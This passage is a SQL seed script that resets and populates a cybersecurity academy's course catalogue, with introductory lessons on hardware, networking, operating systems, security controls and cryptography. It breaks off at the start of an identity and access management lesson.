-- Full curriculum seed for Brown Hat Cybersecurity Academy
-- Run this after migrations. Clears existing course data and inserts all levels with full lesson content.
-- Order: delete dependent rows first, then courses, then insert courses -> modules -> lessons.

BEGIN;

-- Clear existing data (preserve subscription_tiers, skills, profiles, etc.)
DELETE FROM public.user_progress;
DELETE FROM public.lessons;
DELETE FROM public.modules;
DELETE FROM public.course_enrollments;
DELETE FROM public.courses;

-- ========== COURSES (all levels) ==========
-- aligned_certifications: certs aligned to this course (from Learning Path); support and exam discounts offered.
INSERT INTO public.courses (id, code, title, description, level, required_tier_level, duration_hours, order_index, aligned_certifications) VALUES
  ('a0000000-0000-4000-8000-000000000001', 'BH-BRIDGE', 'Technical Readiness Bridge', 'Build the digital and IT foundations you need before diving into cybersecurity. No prior experience required.', 0, 1, 40, 1, '{}'),
  ('a0000000-0000-4000-8000-000000000002', 'BH-FOUND-1', 'IT & Cyber Foundations I', 'Core IT skills, hardware, and cybersecurity concepts. Aligned to CompTIA A+ and Network+.', 1, 1, 80, 2, ARRAY['CompTIA A+']),
  ('a0000000-0000-4000-8000-000000000003', 'BH-FOUND-2', 'IT & Cyber Foundations II', 'Networking fundamentals and security principles. Completes Foundations level for A+ and Network+ readiness.', 1, 1, 70, 3, ARRAY['CompTIA Network+']),
  ('a0000000-0000-4000-8000-000000000004', 'BH-CYBER-2', 'Core Cyber Foundations', 'Threat landscape, security controls, and operations. Aligned to CompTIA Security+ and ISC² CC.', 2, 2, 90, 4, ARRAY['CompTIA Security+', 'ISC² CC']),
  ('a0000000-0000-4000-8000-000000000005', 'BH-OPS-2', 'Practitioner Core: Cyber Operations', 'SOC operations, incident response, and threat hunting. Aligned to CompTIA CySA+ and ISC² SSCP.', 3, 2, 100, 5, ARRAY['CompTIA CySA+', 'ISC² SSCP']),
  ('a0000000-0000-4000-8000-000000000006', 'BH-SPEC-SOC', 'Specialisation: SOC & Incident Response', 'Advanced SOC, SIEM, and incident handling. Aligned to CompTIA CySA+.', 4, 3, 120, 6, ARRAY['CompTIA CySA+']),
  ('a0000000-0000-4000-8000-000000000007', 'BH-ADV', 'Advanced & Leadership', 'Security architecture, governance, and leadership. Aligned to CISSP and CISM.', 5, 3, 150, 7, ARRAY['CISSP', 'CISM']);

-- ========== LEVEL 0: BRIDGE — MODULES ==========
INSERT INTO public.modules (id, course_id, title, description, order_index) VALUES
  ('b0000000-0000-4000-8000-000000000001', 'a0000000-0000-4000-8000-000000000001', 'Computer Fundamentals & Digital Literacy', 'Essential computer hardware, software, and basic operations.', 1),
  ('b0000000-0000-4000-8000-000000000002', 'a0000000-0000-4000-8000-000000000001', 'Basic Networking Concepts', 'How computers communicate and connect.', 2),
  ('b0000000-0000-4000-8000-000000000003', 'a0000000-0000-4000-8000-000000000001', 'Introduction to Operating Systems', 'Windows, Linux, and mobile OS basics.', 3),
  ('b0000000-0000-4000-8000-000000000004', 'a0000000-0000-4000-8000-000000000001', 'Professional Communication & Study Skills', 'Communicating clearly and learning effectively.', 4);

-- ========== BRIDGE: LESSONS (Module 1 — Computer Fundamentals) ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
  ('b0000000-0000-4000-8000-000000000001', 'What is a Computer?', 'Understanding the basic components of a computer system.', $md$
# What is a Computer?

## Introduction

This lesson introduces what a computer is and how hardware and software work together. You will learn the main components and why they matter for security and support roles.

## Objectives

By the end of this lesson you will be able to:

- Define a computer in terms of input, processing, and output.
- Distinguish hardware from software and give examples of each.
- Explain why computer fundamentals matter for cybersecurity.

## Main Components

- **Hardware** — The physical parts you can touch: the case, screen, keyboard, memory (RAM), storage (disk or SSD), and the central processing unit (CPU).
- **Software** — Programs and operating systems that tell the hardware what to do. Examples include Windows, macOS, Linux, and applications like web browsers and word processors.

A computer takes **input** (keyboard, mouse, network), **processes** it using the CPU and memory, and produces **output** (screen, files, network). Data and programs live on **storage** when the machine is off; when you run a program, the CPU loads it into **RAM** so it can work quickly.

## Example: Where Your Data Lives

When you open a document, the application reads it from **storage** (disk or SSD) into **RAM**. The **CPU** runs the application code and your edits. When you save, the CPU writes the updated data back from RAM to **storage**. If the power fails before you save, changes in RAM are lost—only what was on storage remains. In security, we care about both: storage can be stolen or imaged; RAM can hold secrets (e.g. passwords) or malware that never touches the disk.

## Why This Matters for Cybersecurity

In cybersecurity, you will often need to understand how data is stored (storage), how it is processed (CPU and memory), and how it moves between components. Knowing the basics helps you identify where risks and protections should be applied. In the workplace, you might need to explain why a laptop was encrypted (to protect data on storage), why a server was rebooted (to clear sensitive data from RAM), or why a failed disk was securely wiped before disposal.

## Key takeaway

Every device you will secure or defend is built from these same building blocks. A solid grasp of computer fundamentals is the first step toward securing them.

## Exam alignment

Foundational; no certification exam.
$md$, 18, 1),
  ('b0000000-0000-4000-8000-000000000001', 'Hardware vs Software', 'The difference between physical components and programs.', $md$
# Hardware vs Software

## Introduction

This lesson explains the difference between hardware and software and how they work together. You will see how each relates to security.

## Objectives

By the end of this lesson you will be able to:

- Define hardware and software and give examples.
- Explain how the CPU, storage, and software interact.
- Describe how hardware and software security differ.

## Hardware and Software

**Hardware** is the physical equipment: the motherboard, CPU, RAM, hard drive or SSD, power supply, and peripherals (keyboard, mouse, monitor). It does not change unless you add, remove, or replace a part.

**Software** is the set of instructions that run on the hardware. It includes the **operating system (OS)** (e.g. Windows, Linux, macOS) and **applications** (browsers, email clients, office suites).

## How They Work Together

The CPU executes instructions from software. Software is stored on disk or SSD and loaded into RAM when running. Without software, hardware can do nothing; without hardware, software has nothing to run on.

## Security Angle

**Hardware security** can include physical access controls and secure boot. **Software security** involves keeping the OS and applications updated and using antivirus. Most attacks target software (e.g. malware, exploits) rather than hardware.

## Key takeaway

Hardware is the physical equipment; software is the instructions that run on it. Both have security implications, with most attacks targeting software.

## Exam alignment

Foundational; no certification exam.
$md$, 20, 2),
  ('b0000000-0000-4000-8000-000000000001', 'Storage and Memory (RAM)', 'How data is stored and used while the computer is on.', $md$
# Storage and Memory (RAM)

## Introduction

This lesson covers the difference between storage and memory (RAM) and how the computer uses both. You will see why this matters for security and forensics.

## Objectives

By the end of this lesson you will be able to:

- Distinguish storage from RAM and describe how each is used.
- Explain what happens to data when the power is off.
- Describe why storage and RAM matter for malware and incident response.

## Storage and RAM

**Storage** (hard drive, SSD) holds data and programs permanently, even when the power is off. **RAM (Random Access Memory)** is temporary working memory. When you open a program, data is copied from storage into RAM so the CPU can work with it quickly. When you shut down, the contents of RAM are lost unless saved back to storage.

## For Cybersecurity

Malware can hide in storage (files) or exist only in RAM (fileless malware). Forensic and incident response work often involves capturing both disk images and RAM to analyse what was running.

## Key takeaway

Storage is permanent; RAM is temporary working memory. Both are relevant to how malware persists and how investigators capture evidence.

## Exam alignment

Foundational; no certification exam.
$md$, 18, 3),
  ('b0000000-0000-4000-8000-000000000001', 'Input and Output Devices', 'How we interact with computers and how they communicate results.', $md$
# Input and Output Devices

## Introduction

This lesson introduces input and output devices and how they connect to the computer. You will learn why they matter for security.

## Objectives

By the end of this lesson you will be able to:

- Define input and output devices and give examples.
- Identify devices that act as both input and output.
- Explain how peripherals can be security risks.

## Input and Output

**Input devices** send data into the computer: keyboard, mouse, touchscreen, microphone, camera. **Output devices** present results: monitor, speakers, printer. Some devices are both (e.g. touchscreen).

## Relevance to Security

Peripherals can be attack vectors: malicious USB devices, compromised cameras or microphones. Display and audio can leak sensitive information. Understanding I/O helps you think about where data can be observed or tampered with.

## Key takeaway

Input and output devices are how we interact with computers; they can also be entry points for attacks or sources of data leakage.

## Exam alignment

Foundational; no certification exam.
$md$, 12, 4);

-- ========== BRIDGE: LESSONS (Module 2 — Basic Networking) ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
  ('b0000000-0000-4000-8000-000000000002', 'What is a Network?', 'Networks connect devices so they can share data and resources.', $md$
# What is a Network?

## Introduction

This lesson introduces what a network is and how devices connect to share data. You will learn basic terms and why networking matters for security.

## Objectives

By the end of this lesson you will be able to:

- Define a network and distinguish LAN from WAN.
- Explain what protocols are and why they matter.
- Describe why networks are central to modern attacks and defences.

## What is a Network?

A **network** is a group of devices (computers, phones, servers) connected to share information and resources. The internet is a global network of networks. **LAN** (Local Area Network) covers one location; **WAN** (Wide Area Network) spans larger areas. **Protocols** (e.g. TCP/IP) define how devices communicate.

## Why It Matters for Cyber

Almost every modern attack involves the network: malware spreads over the network, attackers move between systems through the network, and data is stolen over the network. Understanding basic networking is essential for defending and monitoring systems.

## Key takeaway

Networks connect devices to share data; protocols define how they communicate. Networking is essential for both using and securing systems.

## Exam alignment

Foundational; no certification exam.
$md$, 15, 1),
  ('b0000000-0000-4000-8000-000000000002', 'IP Addresses and the Internet', 'How devices are identified and how traffic finds its way.', $md$
# IP Addresses and the Internet

## Introduction

This lesson covers how devices are identified on a network (IP addresses) and how names are resolved to addresses (DNS). You will see how this relates to security and monitoring.

## Objectives

By the end of this lesson you will be able to:

- Explain what an IP address is and the difference between IPv4 and IPv6.
- Describe how DNS resolves names to addresses.
- Explain how IP addresses are used in security (targeting, blocking, monitoring).

## IP Addresses and DNS

An **IP address** is a unique identifier for a device on a network. **IPv4** uses four numbers (e.g. 192.168.1.1); **IPv6** uses longer addresses. When you open a website, **DNS (Domain Name System)** turns a name like www.example.com into an IP address. Attackers use IP addresses to target machines or spoof their origin. Monitoring and firewalls use IP addresses and ports to allow or block traffic.

## Key takeaway

IP addresses identify devices; DNS maps names to addresses. Both are used by defenders and attackers.

## Exam alignment

Foundational; no certification exam.
$md$, 20, 2),
  ('b0000000-0000-4000-8000-000000000002', 'Wi-Fi and Safe Connectivity', 'How wireless networks work and how to connect safely.', $md$
# Wi-Fi and Safe Connectivity

## Introduction

This lesson covers how Wi-Fi works and how to connect safely at home and on public networks. You will learn what to recommend when assessing network security.

## Objectives

By the end of this lesson you will be able to:

- Explain how Wi-Fi and routers work at a basic level.
- Recommend secure Wi-Fi settings (encryption, strong passwords).
- Describe risks of public Wi-Fi and when to use a VPN.

## Wi-Fi and Security

**Wi-Fi** lets devices connect using radio waves. A **router** broadcasts a network name (SSID) and manages which devices can join. Use **WPA2 or WPA3** encryption and a strong password. On **public Wi-Fi**, avoid sending sensitive data unless you use a VPN or a trusted, encrypted connection. As a security professional, you will assess whether networks are configured securely and recommend encryption and access controls.

## Key takeaway

Secure Wi-Fi with strong encryption and passwords; treat public Wi-Fi as untrusted unless you use a VPN or encrypted channels.

## Exam alignment

Foundational; no certification exam.
$md$, 18, 3);

-- ========== BRIDGE: LESSONS (Module 3 — Operating Systems) ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
  ('b0000000-0000-4000-8000-000000000003', 'What is an Operating System?', 'The OS manages hardware and runs your applications.', $md$
# What is an Operating System?

## Introduction

This lesson explains what an operating system is and what it does. You will learn why the OS is a central focus for security.

## Objectives

By the end of this lesson you will be able to:

- Define the role of an operating system (managing hardware and running programs).
- Name common OSs and what they manage (processes, memory, file system).
- Explain why patching and least privilege matter for OS security.

## The Operating System

The **operating system (OS)** manages the hardware (CPU, memory, storage, network) and provides a platform for other programs. It handles process management, memory management, the file system, and the user interface. Common OSs include **Windows**, **macOS**, and **Linux**. The OS is a primary target for attackers; patching, strong authentication, and limiting privileges are core security practices.

## Key takeaway

The OS is the layer between hardware and applications; securing it is foundational.

## Exam alignment

Foundational; no certification exam.
$md$, 18, 1),
  ('b0000000-0000-4000-8000-000000000003', 'Windows and macOS Basics', 'Everyday use and file management on the most common OSs.', $md$
# Windows and macOS Basics

## Introduction

This lesson covers everyday use of Windows and macOS: file management, installing software, and applying updates. You will see why these skills matter for support and security roles.

## Objectives

By the end of this lesson you will be able to:

- Perform basic file management and software installation on Windows and macOS.
- Explain why keeping the OS updated is a key security habit.
- Describe when you need to work across both platforms (support, analysis, tool deployment).

## Windows and macOS

Both provide a graphical interface for file management, installing and uninstalling software, and applying updates. Keeping the OS updated is a key security habit. You will often need to work on both Windows and macOS when helping users, analysing a compromised machine, or deploying security tools.

## Key takeaway

Fluency in both Windows and macOS supports user support, incident analysis, and security tooling.

## Exam alignment

Foundational; no certification exam.
$md$, 20, 2),
  ('b0000000-0000-4000-8000-000000000003', 'Introduction to Linux', 'Why Linux matters in cybersecurity and how to get started.', $md$
# Introduction to Linux

## Introduction

This lesson introduces Linux and why it matters for cybersecurity. You will learn key concepts: distributions, the command line, and users and permissions.

## Objectives

By the end of this lesson you will be able to:

- Explain why Linux is important in servers, cloud, and security tools.
- Define distributions and give examples.
- Describe the role of the command line and of users and permissions.

## Linux in Practice

**Linux** is used on many servers, cloud systems, and security tools. You will encounter it in web servers, firewalls, and penetration-testing distributions (e.g. Kali). Key concepts: **distributions** (e.g. Ubuntu, Debian), the **command line** for administration, and **users and permissions**. A large portion of the internet runs on Linux; understanding Linux basics is a core skill for cybersecurity.

## Key takeaway

Linux is widespread in infrastructure and security; learning distributions, the command line, and permissions is essential.

## Exam alignment

Foundational; no certification exam.
$md$, 22, 3);

-- ========== BRIDGE: LESSONS (Module 4 — Professional Communication) ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
  ('b0000000-0000-4000-8000-000000000004', 'Communicating Clearly in Tech', 'Writing and speaking so others understand.', $md$
# Communicating Clearly in Tech

## Introduction

This lesson covers how to communicate technical issues clearly to management and non-technical audiences. You will learn structure and tone for reports, email, and meetings.

## Objectives

By the end of this lesson you will be able to:

- Explain technical issues in plain language.
- Structure written and verbal communication (main point first, then detail).
- Be accurate about risks and follow up in writing when it matters.

## Main content

Explain technical issues in plain language when reporting to management or writing for general users. Be structured: use short paragraphs, bullet points, and clear headings. State the main point first then add detail. Be accurate about risks. In email and reports, be professional and factual; in meetings, confirm actions and follow up in writing when it matters.

## Key takeaway

Clear, structured communication builds trust and ensures actions are understood and tracked.

## Exam alignment

Foundational; no certification exam.
$md$, 15, 1),
  ('b0000000-0000-4000-8000-000000000004', 'Study Skills and Time Management', 'How to learn effectively and stay on track.', $md$
# Study Skills and Time Management

## Introduction

This lesson covers how to learn effectively and manage your time. You will build habits that support you through the curriculum and into your career.

## Objectives

By the end of this lesson you will be able to:

- Practice actively (labs, tools) and space out learning and review.
- Take notes in your own words and set priorities.
- Block time for study and reduce distractions.

## Main content

Practice actively: do labs and use the tools you read about. Space out learning and review earlier material. Take notes in your own words. Set priorities and block time for study; reduce distractions. Building these habits now will support you through the rest of the Brown Hat path and into your career.

## Key takeaway

Active practice, spaced review, and clear priorities make learning stick and keep you on track.

## Exam alignment

Foundational; no certification exam.
$md$, 18, 2);

-- ========== LEVEL 1: BH-FOUND-1 — MODULES ==========
INSERT INTO public.modules (id, course_id, title, description, order_index) VALUES
  ('b0000000-0000-4000-8000-000000000011', 'a0000000-0000-4000-8000-000000000002', 'Introduction to Cybersecurity', 'The field, threats, and career paths.', 1),
  ('b0000000-0000-4000-8000-000000000012', 'a0000000-0000-4000-8000-000000000002', 'Hardware and Mobile Devices', 'Hardware, components, and mobile device support.', 2),
  ('b0000000-0000-4000-8000-000000000013', 'a0000000-0000-4000-8000-000000000002', 'Networking Fundamentals', 'TCP/IP, DNS, cabling, and network types.', 3),
  ('b0000000-0000-4000-8000-000000000014', 'a0000000-0000-4000-8000-000000000002', 'Security Concepts and Best Practices', 'CIA triad, physical security, and secure disposal.', 4);

-- ========== BH-FOUND-1: LESSONS ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
  ('b0000000-0000-4000-8000-000000000011', 'Welcome to Cybersecurity', 'Course overview and what you will learn.', $md$
# Welcome to Cybersecurity

This course builds your IT and cybersecurity foundations. You will learn hardware and software basics, networking fundamentals, and core security concepts that every practitioner needs.

## What You Will Cover

- The threat landscape and why security matters
- Hardware, mobile devices, and troubleshooting
- Networking: TCP/IP, DNS, network types, and security
- Security fundamentals: CIA triad, access control, and safe practices

## How to Use This Course

Work through each module in order. Complete the lessons and take notes; later courses (Core Cyber, Practitioner) build directly on these concepts. By the end you will be ready to move on to core security and practitioner-level content.

## Exam alignment

A+ 220-1102 Operational Procedures; course overview.
$md$, 10, 1),
  ('b0000000-0000-4000-8000-000000000011', 'The Threat Landscape', 'Types of threats, actors, and attack vectors.', $md$
# The Threat Landscape

**Threat actors** include nation-states, criminal groups, hacktivists, and insiders. They seek financial gain, espionage, disruption, or notoriety. **Attack vectors** are the ways they get in: phishing, malware, exploiting vulnerabilities, weak passwords, or physical access.

## Common Threats

- **Malware** — Viruses, worms, ransomware, and trojans that damage or compromise systems.
- **Phishing** — Fraudulent emails or sites that trick users into giving credentials or installing malware.
- **Exploits** — Use of software vulnerabilities to gain unauthorised access or control.

Understanding who might attack and how they do it helps you prioritise defences and explain risks to others.

## Example: How an Attack Often Starts

Many breaches start with **phishing**: an employee gets an email that looks like it is from IT or a vendor, clicks a link, and enters their password on a fake site—or opens an attachment that installs malware. The attacker now has credentials or a foothold. From there they may move to other systems (lateral movement) or steal data. Defences include training users to spot phishing, multi-factor authentication (so a stolen password is not enough), and patching systems so exploits are harder.

## Why This Matters in the Workplace

In a support or security role, you will be asked to help prevent and respond to threats. You might deploy antivirus, advise on strong passwords and MFA, or help investigate a suspected phishing email. Being able to name the main threat types and vectors—and explain them in simple terms—helps you work with colleagues and prioritise what to fix first (e.g. patch critical systems, enforce MFA).

## Key takeaway

Threat actors use many vectors; phishing and malware are common. Understanding the landscape helps you prioritise defences and communicate risk.

## Exam alignment

A+ 220-1102 2.0 (Security); threat types and attack vectors.
$md$, 22, 2),
  ('b0000000-0000-4000-8000-000000000012', 'Motherboard and Internal Components', 'Motherboard, CPU, RAM, and expansion.', $md$
# Motherboard and Internal Components

The **motherboard** is the main circuit board that connects the CPU, RAM, storage, and expansion cards. The **CPU** executes instructions; **RAM** provides temporary storage for running programs; **expansion slots** (e.g. PCIe) allow adding graphics cards, network cards, and other hardware.

## Key Concepts

You should be able to identify components, understand compatibility (e.g. RAM type and speed, CPU socket), and perform basic troubleshooting (e.g. reseating RAM, checking connections). Secure disposal of components (e.g. wiping storage, recycling) is also part of operational procedures.

## Exam alignment

A+ 220-1101 3.0 (Hardware).
$md$, 22, 1),
  ('b0000000-0000-4000-8000-000000000012', 'Mobile Devices and Connectivity', 'Laptops, smartphones, and wireless connectivity.', $md$
# Mobile Devices and Connectivity

Laptops, tablets, and smartphones use similar principles to desktops but with different form factors, batteries, and connectivity (Wi-Fi, Bluetooth, cellular). **Mobile device management (MDM)** and **BYOD** (bring your own device) policies are common in organisations and have security implications: device encryption, remote wipe, and acceptable use.

## Why This Matters

Foundation exams include mobile device hardware (e.g. display types, batteries), connectivity, and troubleshooting. Understanding how mobile devices connect and how to secure them supports both exam readiness and real-world support roles.

## Exam alignment

A+ 220-1101 1.0 (Mobile Devices).
$md$, 20, 2),
  ('b0000000-0000-4000-8000-000000000013', 'TCP/IP and the OSI Model', 'How data moves across networks.', $md$
# TCP/IP and the OSI Model

**TCP/IP** is the suite of protocols that powers the internet: **IP** for addressing and routing, **TCP** for reliable delivery, **UDP** for lightweight delivery, and **DNS** for name resolution. The **OSI model** (seven layers) and the **TCP/IP model** (four layers) describe how data is encapsulated and transmitted from application to physical link.

## Why It Matters

TCP/IP, subnetting, and the OSI model are core networking topics. Security controls (firewalls, IDS/IPS) operate at specific layers; understanding layers helps you troubleshoot and design secure networks. You will use this in every subsequent security course.

## Exam alignment

Network+ 1.0; A+ 220-1101 2.0 (Networking).
$md$, 25, 1),
  ('b0000000-0000-4000-8000-000000000013', 'Network Types and Cabling', 'LAN, WAN, wireless, and physical media.', $md$
# Network Types and Cabling

**LAN** (local area network) and **WAN** (wide area network) differ in scope. **Ethernet** uses twisted-pair (e.g. Cat 5e, Cat 6) or fibre cabling. **Wi-Fi** (802.11) provides wireless access. Choosing the right media and securing wireless networks (WPA2/WPA3, strong passwords, placement of access points) is part of network implementation and security.

## Exam alignment

Network+ 1.0, 2.0 (Networking Fundamentals, Implementations).
$md$, 20, 2),
  ('b0000000-0000-4000-8000-000000000014', 'CIA Triad and Security Controls', 'Confidentiality, integrity, availability, and control types.', $md$
# CIA Triad and Security Controls

The **CIA triad** is the foundation of security: **Confidentiality** (only authorised access), **Integrity** (data is accurate and unchanged), and **Availability** (systems and data are accessible when needed). **Security controls** can be technical (firewalls, encryption), administrative (policies, training), or physical (locks, badges).

| Pillar | Meaning | Example control |
|--------|---------|------------------|
| **Confidentiality** | Only authorised people see data | Encryption, access control, need-to-know |
| **Integrity** | Data is correct and not altered | Backups, hashing, access logs |
| **Availability** | Systems and data are there when needed | Redundancy, backups, patching, DDoS mitigation |

## Example: Applying the Triad

For a customer database: **Confidentiality** — encrypt the data and restrict access to staff who need it. **Integrity** — use backups and logging so you can detect or recover from tampering. **Availability** — keep the server patched and monitored so it stays up, and have a backup so you can restore if something fails. One control often supports more than one pillar (e.g. access control supports confidentiality and can support integrity by limiting who can change data).

## Best Practices

Apply defence in depth (multiple layers of controls), least privilege (minimum access necessary), and secure disposal (wipe drives, destroy media) when decommissioning equipment. These concepts underpin all later security work. In the workplace, you will be expected to recommend controls that match the risk: for sensitive data, emphasise confidentiality and integrity; for critical systems, emphasise availability and recovery.

## Exam alignment

A+ 220-1102 2.0 (Security); Network+ 4.0.
$md$, 25, 1),
  ('b0000000-0000-4000-8000-000000000014', 'Physical Security and Authentication', 'Access control and authentication methods.', $md$
# Physical Security and Authentication

**Physical security** protects buildings and hardware: locks, badges, cameras, and environmental controls (e.g. fire suppression). **Authentication** verifies identity: something you know (password), something you have (token, card), or something you are (biometrics). **Multi-factor authentication (MFA)** combines two or more factors and greatly reduces the risk of credential theft.

## For the Workplace

You will be expected to recommend MFA, strong password policies, and physical security measures. Authentication and access control are covered in foundational and security exams; this lesson gives you the foundation.

## Exam alignment

A+ 220-1102 2.0 (Physical security, authentication).
$md$, 18, 2);

-- ========== LEVEL 1: BH-FOUND-2 — MODULES ==========
INSERT INTO public.modules (id, course_id, title, description, order_index) VALUES
  ('b0000000-0000-4000-8000-000000000021', 'a0000000-0000-4000-8000-000000000003', 'Network Services and Protocols', 'DNS, DHCP, and common application protocols.', 1),
  ('b0000000-0000-4000-8000-000000000022', 'a0000000-0000-4000-8000-000000000003', 'Network Security and Hardening', 'Firewalls, IDS/IPS, and secure configuration.', 2),
  ('b0000000-0000-4000-8000-000000000023', 'a0000000-0000-4000-8000-000000000003', 'Operating System Security', 'Windows and Linux security basics.', 3);

-- ========== BH-FOUND-2: LESSONS ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
  ('b0000000-0000-4000-8000-000000000021', 'DNS and DHCP', 'How name resolution and IP assignment work.', $md$
# DNS and DHCP

**DNS (Domain Name System)** translates human-readable names (e.g. www.example.com) into IP addresses. **DHCP (Dynamic Host Configuration Protocol)** automatically assigns IP addresses and other settings to devices on a network. Both are essential for network operations. Misconfigured or compromised DNS can redirect users to malicious sites; securing DNS (e.g. DNSSEC, monitoring) is part of network security.

## Exam alignment

Network+ 1.0, 3.0 (Network services).
$md$, 20, 1),
  ('b0000000-0000-4000-8000-000000000021', 'Application Protocols and Ports', 'HTTP/HTTPS, SSH, FTP, and well-known ports.', $md$
# Application Protocols and Ports

**Ports** identify services on a host (e.g. 80 for HTTP, 443 for HTTPS, 22 for SSH). **HTTP** is unencrypted; **HTTPS** uses TLS for encryption. **SSH** secures remote access; **FTP** is an older file transfer protocol (prefer SFTP or SCP for security). Firewalls and security tools use port and protocol information to allow or block traffic. Knowing common ports and protocols is essential for configuring and troubleshooting security controls.

## Exam alignment

Network+ 1.0, 3.0 (Protocols and ports).
$md$, 22, 2),
  ('b0000000-0000-4000-8000-000000000022', 'Firewalls and Network Segmentation', 'How firewalls work and why we segment networks.', $md$
# Firewalls and Network Segmentation

A **firewall** filters traffic based on rules (e.g. allow/deny by IP, port, or application). **Network segmentation** divides the network into zones (e.g. DMZ, internal, management) so that a breach in one zone does not automatically expose everything. Segmenting and restricting traffic between segments is a core security practice.

## How It Works in Practice

Typical zones: **DMZ (demilitarised zone)** — public-facing servers (e.g. web); the firewall allows only the traffic those servers need (e.g. HTTP/HTTPS from the internet, and limited traffic from internal). **Internal** — workstations and internal servers; traffic from the internet is blocked except what is explicitly allowed. **Management** — administrative access to network devices; restricted to a small set of IPs or VPN. If an attacker compromises a web server in the DMZ, they still must get through another firewall to reach internal or management; that limits how far they can go.

## Example: One Firewall Rule

A rule might say: "Allow TCP port 443 from any source to the web server IP." That lets users reach the website. A second rule: "Allow TCP port 22 from the management network only to the web server." That lets admins use SSH from a locked-down network. Everything else is denied by default. Understanding rules like this helps you configure firewalls and troubleshoot "why cannot I reach this service?"

## Why This Matters in the Workplace

You will need to explain why segmentation matters (containment, compliance) and how to read or request firewall rules. In support or security roles, you may help verify that only required traffic is allowed between segments or that a new server is placed in the right zone. This lesson gives you the vocabulary and basic model used in real networks.

## Exam alignment

Network+ 4.0 (Network Security).
$md$, 30, 1),
  ('b0000000-0000-4000-8000-000000000022', 'Intrusion Detection and Prevention', 'IDS vs IPS and how they fit into security operations.', $md$
# Intrusion Detection and Prevention

**IDS (Intrusion Detection System)** monitors traffic and alerts on suspicious activity. **IPS (Intrusion Prevention System)** can also block or mitigate attacks. Both use signatures and/or behaviour-based analysis. They are deployed at network or host level. Understanding IDS/IPS prepares you for SOC roles where monitoring and response are central.

## Exam alignment

Network+ 4.0 (Network Security).
$md$, 20, 2),
  ('b0000000-0000-4000-8000-000000000023', 'Windows Security Basics', 'Updates, user accounts, and local security.', $md$
# Windows Security Basics

Keep Windows updated (security patches), use strong passwords or Windows Hello, limit use of administrator accounts, and enable the built-in firewall and Defender. **Group Policy** can enforce security settings across the organisation. **User Account Control (UAC)** reduces the impact of malware by prompting for elevation.

## Exam alignment

A+ 220-1102 1.0 (Windows); Security+ secure host configuration.
$md$, 22, 1),
  ('b0000000-0000-4000-8000-000000000023', 'Linux Security Basics', 'Users, permissions, and basic hardening.', $md$
# Linux Security Basics

Linux uses **users and groups** and **file permissions** (read, write, execute for owner, group, and others). Commands like chmod, chown, and sudo are fundamental. Keep the system updated (apt, yum), disable unnecessary services, and use SSH with key-based authentication instead of passwords where possible. Many security tools and servers run on Linux; this foundation supports Core Cyber and Practitioner courses.

## Exam alignment

A+ 220-1102 1.0 (Linux); Security+ secure host configuration.
$md$, 25, 2);

-- ========== LEVEL 2: BH-CYBER-2 — MODULES ==========
INSERT INTO public.modules (id, course_id, title, description, order_index) VALUES
  ('b0000000-0000-4000-8000-000000000031', 'a0000000-0000-4000-8000-000000000004', 'General Security Concepts', 'Controls, cryptography, and identity.', 1),
  ('b0000000-0000-4000-8000-000000000032', 'a0000000-0000-4000-8000-000000000004', 'Threats and Vulnerabilities', 'Threat actors, attacks, and mitigations.', 2),
  ('b0000000-0000-4000-8000-000000000033', 'a0000000-0000-4000-8000-000000000004', 'Security Architecture and Operations', 'Design and day-to-day operations.', 3),
  ('b0000000-0000-4000-8000-000000000034', 'a0000000-0000-4000-8000-000000000004', 'Security Program Management and Oversight', 'Policies, compliance, awareness, and third-party risk.', 4);

-- ========== BH-CYBER-2: LESSONS ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
  ('b0000000-0000-4000-8000-000000000031', 'Security Controls and Cryptography', 'Technical, administrative, physical controls; encryption basics.', $md$
# Security Controls and Cryptography

## Introduction

This lesson covers how organisations reduce risk through security controls and how cryptography protects data and communications. You will learn control types, the role of encryption and hashing, and how symmetric and asymmetric cryptography work together in practice.

## Objectives

By the end of this lesson you will be able to:

- Classify security controls as preventive, detective, corrective, deterrent, or compensatory.
- Explain how cryptography supports confidentiality, integrity, and non-repudiation.
- Distinguish symmetric from asymmetric encryption and describe typical use cases.
- Describe how TLS uses both symmetric and asymmetric cryptography for secure communication.

## Security Controls

**Security controls** are measures that reduce risk. They can be **technical** (firewalls, encryption, access controls), **administrative** (policies, training, procedures), or **physical** (locks, badges, environmental controls). By function they are:

- **Preventive** — Stop an incident (e.g. firewall blocks unauthorised access).
- **Detective** — Identify when something has happened (e.g. IDS alerts, logging).
- **Corrective** — Fix or limit damage after an incident (e.g. patches, backups).
- **Deterrent** — Discourage attacks (e.g. warnings, visible controls).
- **Compensating** — Alternative when a primary control is not possible (e.g. extra monitoring).

Controls are most effective when layered (defence in depth) and aligned to the organisation''s risk appetite.

## Cryptography Basics

**Cryptography** supports three goals:

- **Confidentiality** — Only intended parties can read the data (encryption).
- **Integrity** — Data has not been altered (hashing, HMAC).
- **Non-repudiation** — The sender cannot deny sending (digital signatures).

**Symmetric encryption** uses one shared key for both encryption and decryption (e.g. AES). It is fast and suitable for bulk data; the challenge is key distribution. **Asymmetric encryption** uses a public key and a private key (e.g. RSA). Data encrypted with the public key can only be decrypted with the private key. Asymmetric is used for key exchange and digital signatures; symmetric is used for the actual data in transit. **TLS** (Transport Layer Security) uses asymmetric cryptography to establish a session and exchange a symmetric key, then uses symmetric encryption for the rest of the session. **Hashing** (e.g. SHA-256) produces a fixed-size fingerprint of data; changing one bit changes the hash. **HMAC** combines a secret key with a hash to verify both integrity and origin.

## Key takeaway

Security controls mitigate risk through prevention, detection, correction, deterrence, and compensation. Cryptography provides confidentiality (encryption), integrity (hashing, HMAC), and non-repudiation (signatures). Symmetric and asymmetric cryptography are used together in protocols like TLS for secure communication.

## Exam alignment

Security+ 1.1–1.2 (General Security Concepts); ISC² CC Security Principles.
$md$, 28, 1),
  ('b0000000-0000-4000-8000-000000000031', 'Identity and Access Management', 'Authentication, authorization, and access models.', $md$
# Identity and Access Management

